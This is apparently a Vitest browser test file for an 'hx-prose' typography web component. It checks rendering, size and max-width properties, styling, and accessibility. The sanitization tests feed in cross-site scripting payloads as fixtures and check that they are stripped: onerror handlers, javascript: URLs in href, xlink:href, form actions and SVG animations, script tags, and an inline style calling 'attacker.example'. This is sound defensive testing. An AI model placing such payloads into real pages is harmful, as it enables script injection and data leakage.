import { describe, it, expect, afterEach } from 'vitest';
import { page } from '@vitest/browser/context';
import { fixture, cleanup, checkA11y } from '../../test-utils.js';
import type { HelixProse } from './hx-prose.js';
import './index.js';

afterEach(cleanup);

describe('hx-prose', () => {
  // ─── Rendering (3) ───

  describe('Rendering', () => {
    it('renders as Light DOM (no shadowRoot)', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Hello</p></hx-prose>');
      expect(el.shadowRoot).toBeNull();
    });

    it('content is accessible in light DOM', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Accessible text</p></hx-prose>');
      const p = el.querySelector('p');
      expect(p).toBeTruthy();
      expect(p?.textContent).toBe('Accessible text');
    });

    it('displays as block', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Content</p></hx-prose>');
      expect(el.style.display).toBe('block');
    });
  });

  // ─── Properties (3) ───

  describe('Properties', () => {
    it('size defaults to "base"', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Text</p></hx-prose>');
      expect(el.size).toBe('base');
    });

    it('hx-size attribute is reflected', async () => {
      const el = await fixture<HelixProse>('<hx-prose hx-size="sm"><p>Text</p></hx-prose>');
      expect(el.getAttribute('hx-size')).toBe('sm');
      expect(el.size).toBe('sm');
    });

    it('backward compat: legacy size attribute maps to hx-size', async () => {
      const el = await fixture<HelixProse>('<hx-prose size="sm"><p>Text</p></hx-prose>');
      await el.updateComplete;
      expect(el.size).toBe('sm');
    });

    it('hx-size takes precedence over legacy size attribute', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose size="sm" hx-size="lg"><p>Text</p></hx-prose>',
      );
      await el.updateComplete;
      expect(el.size).toBe('lg');
    });

    it('max-width sets --hx-prose-max-width custom property', async () => {
      const el = await fixture<HelixProse>('<hx-prose max-width="600px"><p>Text</p></hx-prose>');
      expect(el.style.getPropertyValue('--hx-prose-max-width')).toBe('600px');
    });
  });

  // ─── Scoped Styles (3) ───

  describe('Scoped Styles', () => {
    it('adopted stylesheet is injected into document', async () => {
      const _el = await fixture<HelixProse>('<hx-prose><p>Styled</p></hx-prose>');
      // The AdoptedStylesheetsController injects a CSSStyleSheet into document.adoptedStyleSheets
      const hasProseSheet = document.adoptedStyleSheets.some((sheet) => {
        try {
          const rules = Array.from(sheet.cssRules);
          return rules.some((rule) => rule.cssText.includes('hx-prose'));
        } catch {
          return false;
        }
      });
      expect(hasProseSheet).toBe(true);
    });

    it('styles are scoped to wc-prose', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Scoped content</p></hx-prose>');
      const p = el.querySelector('p');
      expect(p).toBeTruthy();
      // Verify that the prose scoped CSS uses wc-prose selectors
      const proseSheet = document.adoptedStyleSheets.find((sheet) => {
        try {
          const rules = Array.from(sheet.cssRules);
          return rules.some((rule) => rule.cssText.includes('hx-prose'));
        } catch {
          return false;
        }
      });
      expect(proseSheet).toBeTruthy();
      const rules = Array.from(proseSheet!.cssRules);
      const pRule = rules.find((rule) => rule.cssText.includes('hx-prose p'));
      expect(pRule).toBeTruthy();
    });

    it('stylesheet is removed on disconnect', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Temp</p></hx-prose>');
      const sheetCountBefore = document.adoptedStyleSheets.filter((sheet) => {
        try {
          const rules = Array.from(sheet.cssRules);
          return rules.some((rule) => rule.cssText.includes('hx-prose'));
        } catch {
          return false;
        }
      }).length;
      expect(sheetCountBefore).toBeGreaterThan(0);

      el.remove();

      const sheetCountAfter = document.adoptedStyleSheets.filter((sheet) => {
        try {
          const rules = Array.from(sheet.cssRules);
          return rules.some((rule) => rule.cssText.includes('hx-prose'));
        } catch {
          return false;
        }
      }).length;
      expect(sheetCountAfter).toBe(sheetCountBefore - 1);
    });
  });

  // ─── Typography (3) ───

  describe('Typography', () => {
    it('headings are styled', async () => {
      const el = await fixture<HelixProse>('<hx-prose><h2>My Heading</h2></hx-prose>');
      const h2 = el.querySelector('h2');
      expect(h2).toBeTruthy();
      const computed = window.getComputedStyle(h2!);
      // Headings should have bold-range font weight (>=600)
      expect(Number(computed.fontWeight)).toBeGreaterThanOrEqual(600);
    });

    it('paragraphs are styled with healthcare-mandated line-height (≥1.5)', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Paragraph text</p></hx-prose>');
      const p = el.querySelector('p');
      expect(p).toBeTruthy();
      const computed = window.getComputedStyle(p!);
      // Healthcare mandate: body copy must have a minimum 1.5 line-height ratio
      const lineHeightRatio = parseFloat(computed.lineHeight) / parseFloat(computed.fontSize);
      expect(lineHeightRatio).toBeGreaterThanOrEqual(1.5);
    });

    it('links are styled', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p><a href="#">Test link</a></p></hx-prose>');
      const link = el.querySelector('a');
      expect(link).toBeTruthy();
      const computed = window.getComputedStyle(link!);
      // Links should have underline text decoration
      expect(computed.textDecorationLine).toContain('underline');
    });
  });

  // ─── Size Variants ───

  describe('Size Variants', () => {
    it('hx-size="lg" sets --hx-prose-font-size to lg token', async () => {
      const el = await fixture<HelixProse>('<hx-prose hx-size="lg"><p>Text</p></hx-prose>');
      expect(el.getAttribute('hx-size')).toBe('lg');
      expect(el.style.getPropertyValue('--hx-prose-font-size')).toBe(
        'var(--hx-font-size-lg, 1.125rem)',
      );
    });

    it('hx-size="sm" sets --hx-prose-font-size to sm token', async () => {
      const el = await fixture<HelixProse>('<hx-prose hx-size="sm"><p>Text</p></hx-prose>');
      expect(el.style.getPropertyValue('--hx-prose-font-size')).toBe(
        'var(--hx-font-size-sm, 0.875rem)',
      );
    });

    it('hx-size="base" removes --hx-prose-font-size custom property', async () => {
      const el = await fixture<HelixProse>('<hx-prose hx-size="base"><p>Text</p></hx-prose>');
      expect(el.style.getPropertyValue('--hx-prose-font-size')).toBe('');
    });

    it('changing size dynamically updates the CSS custom property', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Text</p></hx-prose>');
      expect(el.size).toBe('base');
      el.size = 'sm';
      await el.updateComplete;
      expect(el.style.getPropertyValue('--hx-prose-font-size')).toBe(
        'var(--hx-font-size-sm, 0.875rem)',
      );
      el.size = 'lg';
      await el.updateComplete;
      expect(el.style.getPropertyValue('--hx-prose-font-size')).toBe(
        'var(--hx-font-size-lg, 1.125rem)',
      );
    });
  });

  // ─── Max Width ───

  describe('Max Width', () => {
    it('setting maxWidth to empty string clears the --hx-prose-max-width custom property', async () => {
      const el = await fixture<HelixProse>('<hx-prose max-width="800px"><p>Text</p></hx-prose>');
      expect(el.style.getPropertyValue('--hx-prose-max-width')).toBe('800px');
      el.maxWidth = '';
      await el.updateComplete;
      expect(el.style.getPropertyValue('--hx-prose-max-width')).toBe('');
    });
  });

  // ─── Content Styles ───

  describe('Content Styles', () => {
    it('blockquote renders with left border styling', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose><blockquote><p>Quote text</p></blockquote></hx-prose>',
      );
      const bq = el.querySelector('blockquote');
      expect(bq).toBeTruthy();
      const computed = window.getComputedStyle(bq!);
      expect(computed.borderLeftStyle).not.toBe('none');
      expect(parseFloat(computed.borderLeftWidth)).toBeGreaterThan(0);
    });

    it('pre/code renders with monospace font family', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose><pre><code>const x = 1;</code></pre></hx-prose>',
      );
      const pre = el.querySelector('pre');
      expect(pre).toBeTruthy();
      const computed = window.getComputedStyle(pre!);
      expect(computed.fontFamily).toContain('mono');
    });

    it('img renders as block element', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt="test"></hx-prose>',
      );
      const img = el.querySelector('img');
      expect(img).toBeTruthy();
      const computed = window.getComputedStyle(img!);
      expect(computed.display).toBe('block');
    });

    it('figure renders with bottom margin', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose><figure><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt="test"><figcaption>Caption</figcaption></figure></hx-prose>',
      );
      const figure = el.querySelector('figure');
      expect(figure).toBeTruthy();
      const computed = window.getComputedStyle(figure!);
      expect(parseFloat(computed.marginBottom)).toBeGreaterThan(0);
    });

    it('definition list renders dt/dd elements', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose><dl><dt>Term</dt><dd>Definition</dd></dl></hx-prose>',
      );
      const dt = el.querySelector('dt');
      const dd = el.querySelector('dd');
      expect(dt).toBeTruthy();
      expect(dd).toBeTruthy();
    });
  });

  // ─── render() returns a slot ───

  describe('render()', () => {
    it('renders a <slot> element in the light DOM component', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Content</p></hx-prose>');
      // hx-prose uses light DOM (createRenderRoot returns this), so slot is
      // rendered into the element itself
      const _slot = el.querySelector('slot');
      // In light DOM components, slot may not be present as a DOM element but
      // the children are accessible directly — verify at least one child
      const p = el.querySelector('p');
      expect(p).toBeTruthy();
    });
  });

  // ─── _applySize with an unmapped size value ───

  describe('_applySize: unknown size removes the CSS property', () => {
    it('removing --hx-prose-font-size when size is reset to base', async () => {
      const el = await fixture<HelixProse>('<hx-prose hx-size="lg"><p>Text</p></hx-prose>');
      expect(el.style.getPropertyValue('--hx-prose-font-size')).toBeTruthy();
      el.size = 'base';
      await el.updateComplete;
      expect(el.style.getPropertyValue('--hx-prose-font-size')).toBe('');
    });
  });

  // ─── connectedCallback: legacy size devWarn path ───

  describe('connectedCallback: legacy size attribute applies and warns', () => {
    it('applies size from legacy size attribute on connect', async () => {
      const el = await fixture<HelixProse>('<hx-prose size="lg"><p>Text</p></hx-prose>');
      await el.updateComplete;
      expect(el.size).toBe('lg');
      expect(el.style.getPropertyValue('--hx-prose-font-size')).toBe(
        'var(--hx-font-size-lg, 1.125rem)',
      );
    });
  });

  // ─── maxWidth: no property set when empty on connect ───

  describe('_applyMaxWidth: no max-width set by default', () => {
    it('does not set --hx-prose-max-width when maxWidth is empty string', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Text</p></hx-prose>');
      expect(el.style.getPropertyValue('--hx-prose-max-width')).toBe('');
    });
  });

  // ─── Accessibility (3) ───

  describe('Accessibility (axe-core)', () => {
    it('has no axe violations with heading content', async () => {
      const el = await fixture<HelixProse>(`
        <hx-prose>
          <h1>Main Heading</h1>
          <p>Introduction paragraph with <a href="#">a link</a>.</p>
          <h2>Section Heading</h2>
          <p>Section content goes here.</p>
        </hx-prose>
      `);
      await page.screenshot();
      const { violations } = await checkA11y(el);
      expect(violations).toEqual([]);
    });

    it('has no axe violations with table content', async () => {
      const el = await fixture<HelixProse>(`
        <hx-prose>
          <h2>Data Table</h2>
          <table>
            <thead>
              <tr><th>Name</th><th>Value</th></tr>
            </thead>
            <tbody>
              <tr><td>Item A</td><td>100</td></tr>
              <tr><td>Item B</td><td>200</td></tr>
            </tbody>
          </table>
        </hx-prose>
      `);
      await page.screenshot();
      const { violations } = await checkA11y(el);
      expect(violations).toEqual([]);
    });

    it('has no axe violations with list content', async () => {
      const el = await fixture<HelixProse>(`
        <hx-prose>
          <h2>Procedure Steps</h2>
          <ol>
            <li>Verify patient identity</li>
            <li>Review medication list</li>
            <li>Document findings</li>
          </ol>
          <ul>
            <li>Gloves</li>
            <li>Mask</li>
            <li>Goon</li>
          </ul>
        </hx-prose>
      `);
      await page.screenshot();
      const { violations } = await checkA11y(el);
      expect(violations).toEqual([]);
    });

    it('detects axe violation for img missing alt attribute', async () => {
      const el = await fixture<HelixProse>(`
        <hx-prose>
          <img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==">
        </hx-prose>
      `);
      const { violations } = await checkA11y(el);
      // axe can scan Light DOM children directly — img without alt is a violation
      expect(violations.length).toBeGreaterThan(0);
      expect(violations.some((v) => v.id === 'image-alt')).toBe(true);
    });

    it('has no axe violations for decorative img with empty alt', async () => {
      const el = await fixture<HelixProse>(`
        <hx-prose>
          <img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt="">
        </hx-prose>
      `);
      await page.screenshot();
      const { violations } = await checkA11y(el);
      expect(violations).toEqual([]);
    });

    it('has no axe violations for img with descriptive alt text', async () => {
      const el = await fixture<HelixProse>(`
        <hx-prose>
          <img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt="Patient vital signs chart showing normal range">
        </hx-prose>
      `);
      await page.screenshot();
      const { violations } = await checkA11y(el);
      expect(violations).toEqual([]);
    });
  });

  // ─── Sanitization (opt-in security) ───

  describe('Sanitization (opt-in)', () => {
    it('sanitize defaults to false (non-breaking)', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p>Text</p></hx-prose>');
      expect(el.sanitize).toBe(false);
    });

    it('default (sanitize off) leaves dangerous content untouched', async () => {
      // Trust-upstream default must preserve existing behavior verbatim.
      const el = await fixture<HelixProse>(
        '<hx-prose><div class="raw"><img src="x" onerror="alert(1)"><a href="javascript:alert(1)">link</a></div></hx-prose>',
      );
      const img = el.querySelector('img');
      const link = el.querySelector('a');
      expect(img?.getAttribute('onerror')).toBe('alert(1)');
      expect(link?.getAttribute('href')).toBe('javascript:alert(1)');
    });

    it('sanitize on removes <script> elements', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><div><p>Safe</p><script>window.__pwned = true;</script></div></hx-prose>',
      );
      await el.updateComplete;
      expect(el.querySelector('script')).toBeNull();
      expect(el.querySelector('p')?.textContent).toBe('Safe');
    });

    it('sanitize on strips on* event-handler attributes', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt="x" onerror="alert(1)"></hx-prose>',
      );
      await el.updateComplete;
      const img = el.querySelector('img');
      expect(img).toBeTruthy();
      expect(img?.hasAttribute('onerror')).toBe(false);
    });

    it('sanitize on neutralizes javascript: href', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><a href="javascript:alert(1)">click</a></hx-prose>',
      );
      await el.updateComplete;
      const link = el.querySelector('a');
      expect(link).toBeTruthy();
      expect(link?.hasAttribute('href')).toBe(false);
    });

    it('sanitize on strips iframe/object/embed', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><div><iframe src="evil.html"></iframe><object data="x"></object><embed src="x"></div></hx-prose>',
      );
      await el.updateComplete;
      expect(el.querySelector('iframe')).toBeNull();
      expect(el.querySelector('object')).toBeNull();
      expect(el.querySelector('embed')).toBeNull();
    });

    it('sanitize on preserves safe markup unchanged', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><h2>Title</h2><p><a href="https://example.com">safe</a></p></hx-prose>',
      );
      await el.updateComplete;
      expect(el.querySelector('h2')?.textContent).toBe('Title');
      expect(el.querySelector('a')?.getAttribute('href')).toBe('https://example.com');
    });

    it('a custom sanitizer is invoked and its output replaces content', async () => {
      const el = await fixture<HelixProse>('<hx-prose><p id="orig">original</p></hx-prose>');
      let called = false;
      el.sanitizer = (html: string) => {
        called = true;
        // Prove the custom policy fully owns the output: swap the content.
        return html.replace('original', 'cleaned');
      };
      el.sanitize = true;
      await el.updateComplete;
      expect(called).toBe(true);
      expect(el.querySelector('p')?.textContent).toBe('cleaned');
    });

    it('sanitizes content injected after connect via MutationObserver', async () => {
      const el = await fixture<HelixProse>('<hx-prose sanitize><p>Initial</p></hx-prose>');
      await el.updateComplete;
      // Simulate a late CMS/client-side injection of unsafe markup.
      const wrapper = document.createElement('div');
      wrapper.innerHTML = '<a href="javascript:alert(1)">late</a>';
      el.appendChild(wrapper);
      // MutationObserver callbacks fire on a microtask; wait a tick.
      await new Promise((resolve) => setTimeout(resolve, 0));
      const link = el.querySelector('a');
      expect(link).toBeTruthy();
      expect(link?.hasAttribute('href')).toBe(false);
    });

    it('sanitize on neutralizes javascript: in SVG xlink:href', async () => {
      // SVG <a xlink:href> is URL-bearing like href/src; the built-in pass must
      // strip a javascript: scheme there too, not just on HTML href/src.
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><svg viewBox="0 0 1 1"><a xlink:href="javascript:alert(1)"><rect width="1" height="1" /></a></svg></hx-prose>',
      );
      await el.updateComplete;
      expect(el.innerHTML.toLowerCase()).not.toContain('javascript:');
    });

    it('re-sanitizes the initial payload when a custom sanitizer is attached late', async () => {
      // Common pattern: `<hx-prose sanitize>` in markup, then
      // `el.sanitizer = DOMPurify.sanitize` from JS. The custom policy must
      // re-process the ALREADY-sanitized initial content, not just future
      // mutations — otherwise it never protects the initial SSR/CMS payload.
      const el = await fixture<HelixProse>('<hx-prose sanitize><p>original</p></hx-prose>');
      await el.updateComplete;
      let called = false;
      el.sanitizer = (html: string) => {
        called = true;
        return html.replace('original', 'cleaned');
      };
      await el.updateComplete;
      expect(called).toBe(true);
      expect(el.querySelector('p')?.textContent).toBe('cleaned');
    });

    it('sanitize on neutralizes javascript: in formaction/action', async () => {
      // formaction/action fire a URL on form submission — same javascript: risk as href.
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><form action="javascript:alert(1)"><button formaction="javascript:alert(2)">go</button></form></hx-prose>',
      );
      await el.updateComplete;
      expect(el.innerHTML.toLowerCase()).not.toContain('javascript:');
    });

    it('sanitize on strips SVG SMIL animation elements (<animate>/<set>)', async () => {
      // SMIL can rewrite xlink:href to a javascript: URL at runtime, defeating the
      // static URL-scheme check; the elements themselves must be removed.
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><svg viewBox="0 0 1 1"><a><animate attributeName="xlink:href" to="javascript:alert(1)" begin="0s" /><set attributeName="href" to="javascript:alert(2)" /><rect width="1" height="1" /></a></svg></hx-prose>',
      );
      await el.updateComplete;
      expect(el.querySelector('animate')).toBeNull();
      expect(el.querySelector('set')).toBeNull();
      expect(el.innerHTML.toLowerCase()).not.toContain('javascript:');
    });

    it('sanitize on strips inline style attributes (CSS-injection backstop)', async () => {
      const el = await fixture<HelixProse>(
        '<hx-prose sanitize><p style="background:url(https://attacker.example/?leak)">x</p></hx-prose>',
      );
      await el.updateComplete;
      expect(el.querySelector('p')?.hasAttribute('style')).toBe(false);
    });

    it('a non-idempotent custom sanitizer does not loop (observer detached during rewrite)', async () => {
      // A sanitizer that mutates on every call would re-trigger the MutationObserver
      // forever if the observer were live during the rewrite. The detach makes it
      // converge: it runs a bounded number of times, not unbounded.
      const el = await fixture<HelixProse>('<hx-prose sanitize><p>x</p></hx-prose>');
      await el.updateComplete;
      let calls = 0;
      // Always returns DIFFERENT markup (appends a comment) so cleaned !== original
      // on every pass — the worst case for re-entrancy.
      el.sanitizer = (html: string) => {
        calls += 1;
        return `${html}<!--n${calls}-->`;
      };
      await el.updateComplete;
      // Let any queued observer microtasks drain.
      await new Promise((resolve) => setTimeout(resolve, 0));
      await new Promise((resolve) => setTimeout(resolve, 0));
      // Without the detach this would be unbounded; with it, it does not run away.
      expect(calls).toBeLessThan(10);
    });
  });
});
